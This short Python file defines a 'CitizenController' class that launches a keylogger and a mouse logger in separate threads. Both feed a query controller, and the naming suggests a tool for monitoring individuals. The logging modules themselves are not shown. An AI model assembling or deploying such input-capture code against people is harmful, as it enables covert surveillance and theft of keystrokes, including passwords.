from modules.keylogger.keylogger import KeyLogger
from modules.mouselogger.mouselogger import MouseLogger

from queryController import QueryController

import threading

class CitizenController:
    def __init__(self, citizen, id, blackList, failings) -> None:
        self.id = id
        self.citizen = citizen
        self.blackList = blackList
        self.failings = failings

    def start(self):
        QUERY_CONTROLLER = QueryController()
        KEYLOGGER = KeyLogger(QUERY_CONTROLLER, ["awd"], ["jwt jwt"])
        thr1 = threading.Thread(target=KEYLOGGER.main, args=())
        thr1.start()
        MOUSELOGGER = MouseLogger(QUERY_CONTROLLER)
        thr2 = threading.Thread(target=MOUSELOGGER.main, args=())
        thr2.start()

if __name__ == "__main__":
    CITIZEN_CONTROLLER = CitizenController(None, 0, None, None)
    CITIZEN_CONTROLLER.start()